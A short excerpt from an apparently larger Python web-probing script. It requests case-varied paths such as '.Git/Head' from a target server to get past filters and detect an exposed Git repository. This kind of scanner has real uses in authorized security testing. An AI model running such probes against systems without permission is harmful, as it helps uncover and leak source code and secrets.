# 6. TRY LOWERCASE/MIXED CASE FOR ENTIRE PATH
# ============================================================================
print("\n[6] CASE VARIATION COMBINATIONS")
print("-" * 70)

case_variants = [
    ".Git/Head",
    ".GIT/head",
    ".git/head",
    ".giT/HeAd",
]

for variant in case_variants:
    try:
        resp = requests.get(f"{target}/{variant}", timeout=5)
        
        if resp.status_code == 200 and len(resp.text) < 500:
            print(f"[?] Path: /{variant} | Status: {resp.status_code}")
            print(f"    Content: {resp.text[:200]}")
            if 'ref:' in resp.text:
                print(f"    [!] VALID GIT DATA FOUND")
    except Exception as e:
        pass

